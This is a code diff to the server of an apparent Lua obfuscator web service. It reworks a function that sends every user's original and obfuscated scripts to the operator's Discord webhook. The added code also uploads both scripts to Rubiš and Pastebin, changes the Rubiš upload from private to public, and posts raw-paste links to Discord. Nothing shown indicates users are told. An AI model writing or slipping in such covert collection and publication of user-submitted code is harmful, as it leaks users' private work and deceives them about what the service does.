@@ -25,44 +25,8 @@ const PASTEBIN_API_KEY = process.env.PASTEBIN_API_KEY;
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-async function sendToDiscordWebhook(originalCode: string, obfuscatedCode: string, meta: { vmType: string; vmLevel: string }) {
-  if (!DISCORD_WEBHOOK_URL) return;
-  try {
-    const form = new FormData();
-    const payload = {
-      embeds: [
-        {
-          title: "P20 Lua Obfuscator — New Usage",
-          color: 0x3b82f6,
-          fields: [
-            { name: "VM Type", value: meta.vmType || "none", inline: true },
-            { name: "VM Level", value: meta.vmLevel || "normal", inline: true },
-            { name: "Original Size", value: `${originalCode.length} chars`, inline: true },
-            { name: "Output Size", value: `${obfuscatedCode.length} chars`, inline: true },
-          ],
-          timestamp: new Date().toISOString(),
-        },
-      ],
-    };
-    form.append("payload_json", JSON.stringify(payload));
-    form.append("files[0]", new Blob([originalCode], { type: "text/plain" }), "original.lua");
-    form.append("files[1]", new Blob([obfuscatedCode], { type: "text/plain" }), "obfuscated.lua");
-
-    const res = await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      body: form as any,
-    });
-
-    if (!res.ok) {
-      console.error("[DISCORD-WEBHOOK] Failed:", res.status, await res.text());
-    }
-  } catch (err: any) {
-    console.error("[DISCORD-WEBHOOK] Error:", err.message);
-  }
-}
-
 async function uploadToRubis(content: string, title: string): Promise<{ url: string }> {
-  const query = new URLSearchParams({ title, public: "false" });
+  const query = new URLSearchParams({ title, public: "true" });
 
   const res = await fetch(`https://api.rubis.app/v2/scrap?${query.toString()}`, {
     method: "POST",
@@ -79,13 +43,13 @@ async function uploadToRubis(content: string, title: string): Promise<{ url: str
     throw new Error(`Rubiš upload failed (HTTP ${res.status})`);
   }
 
-  const viewUrl = data?.view || (data?.scrapID ? `https://rubis.app/view/?scrap=${data.scrapID}` : null);
-  if (!viewUrl) {
-    console.error("[API-ERROR] Rubiš response missing scrapID/view:", rawText);
+  const rawUrl = data?.raw || (data?.scrapID ? `https://api.rubis.app/v2/scrap/${data.scrapID}/raw` : null);
+  if (!rawUrl) {
+    console.error("[API-ERROR] Rubiš response missing scrapID/raw:", rawText);
     throw new Error("Rubiš response didn't include a scrap id — their API response format may have changed.");
   }
 
-  return { url: viewUrl };
+  return { url: rawUrl };
 }
 
 async function uploadToPastebin(content: string, title: string): Promise<{ url: string }> {
@@ -114,7 +78,67 @@ async function uploadToPastebin(content: string, title: string): Promise<{ url: 
     throw new Error(`Pastebin upload failed: ${text}`);
   }
 
-  return { url: text.trim() };
+  const pasteUrl = text.trim();
+  const rawUrl = pasteUrl.replace("pastebin.com/", "pastebin.com/raw/");
+
+  return { url: rawUrl };
+}
+
+async function uploadToAllProviders(content: string, title: string): Promise<{ rubis: string | null; pastebin: string | null }> {
+  const [rubisResult, pastebinResult] = await Promise.allSettled([
+    uploadToRubis(content, title),
+    uploadToPastebin(content, title),
+  ]);
+
+  return {
+    rubis: rubisResult.status === "fulfilled" ? rubisResult.value.url : null,
+    pastebin: pastebinResult.status === "fulfilled" ? pastebinResult.value.url : null,
+  };
+}
+
+async function sendToDiscordWebhook(originalCode: string, obfuscatedCode: string, meta: { vmType: string; vmLevel: string }) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  try {
+    const [originalLinks, outputLinks] = await Promise.all([
+      uploadToAllProviders(originalCode, "P20 - Original Script"),
+      uploadToAllProviders(obfuscatedCode, "P20 - Obfuscated Script"),
+    ]);
+
+    const form = new FormData();
+    const payload = {
+      embeds: [
+        {
+          title: "P20 Lua Obfuscator — New Usage",
+          color: 0x3b82f6,
+          fields: [
+            { name: "VM Type", value: meta.vmType || "none", inline: true },
+            { name: "VM Level", value: meta.vmLevel || "normal", inline: true },
+            { name: "Original Size", value: `${originalCode.length} chars`, inline: true },
+            { name: "Output Size", value: `${obfuscatedCode.length} chars`, inline: true },
+            { name: "Rubiš (Original)", value: originalLinks.rubis || "upload failed", inline: false },
+            { name: "Rubiš (Output)", value: outputLinks.rubis || "upload failed", inline: false },
+            { name: "Pastebin (Original)", value: originalLinks.pastebin || "upload failed", inline: false },
+            { name: "Pastebin (Output)", value: outputLinks.pastebin || "upload failed", inline: false },
+          ],
+          timestamp: new Date().toISOString(),
+        },
+      ],
+    };
+    form.append("payload_json", JSON.stringify(payload));
+    form.append("files[0]", new Blob([originalCode], { type: "text/plain" }), "original.lua");
+    form.append("files[1]", new Blob([obfuscatedCode], { type: "text/plain" }), "obfuscated.lua");
+
+    const res = await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: form as any,
+    });
+
+    if (!res.ok) {
+      console.error("[DISCORD-WEBHOOK] Failed:", res.status, await res.text());
+    }
+  } catch (err: any) {
+    console.error("[DISCORD-WEBHOOK] Error:", err.message);
+  }
 }
 
 app.use(express.json({ limit: "25mb" }));
